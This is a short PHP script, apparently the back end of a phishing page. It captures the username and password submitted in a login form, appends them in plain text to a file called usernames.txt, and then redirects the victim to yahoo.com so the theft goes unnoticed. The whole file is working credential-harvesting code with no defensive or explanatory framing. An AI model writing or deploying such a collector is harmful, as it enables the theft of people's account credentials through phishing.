<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://yahoo.com');
exit();
